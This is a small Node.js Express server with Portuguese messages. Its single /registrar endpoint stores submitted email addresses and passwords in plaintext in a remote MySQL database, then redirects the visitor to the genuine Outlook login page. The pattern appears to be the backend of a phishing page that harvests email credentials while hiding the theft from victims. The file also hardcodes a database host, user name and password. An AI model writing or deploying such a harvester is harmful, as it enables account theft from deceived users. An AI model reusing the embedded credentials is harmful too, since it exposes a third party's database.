const express = require('express');
const mysql = require('mysql2/promise'); // Use 'mysql2/promise' para suportar Promessas

const app = express();
const port = 3000;

const dbConfig = {
  host: 'mysql744.umbler.com',
  user: 'contato',
  password: 'Risada1711.',
  database: 'uol',
};

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/registrar', async (req, res) => {
  const email = req.body.email;
  const senha = req.body.password;

  if (email && senha) {
    try {
      const connection = await mysql.createConnection(dbConfig);
      const sql = 'INSERT INTO usuarios (email, senha) VALUES (?, ?)';
      const [rows] = await connection.execute(sql, [email, senha]);
      connection.end();

      console.log('Usuário registrado com sucesso');
      res.redirect('https://outlook.live.com/mail/0/?nlp=1');
    } catch (error) {
      console.error('Erro ao inserir no banco de dados: ' + error.message);
      res.status(500).send('Erro ao registrar usuário.');
    }
  } else {
    res.status(400).send('Por favor, forneça um e-mail e uma senha.');
  }
});

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
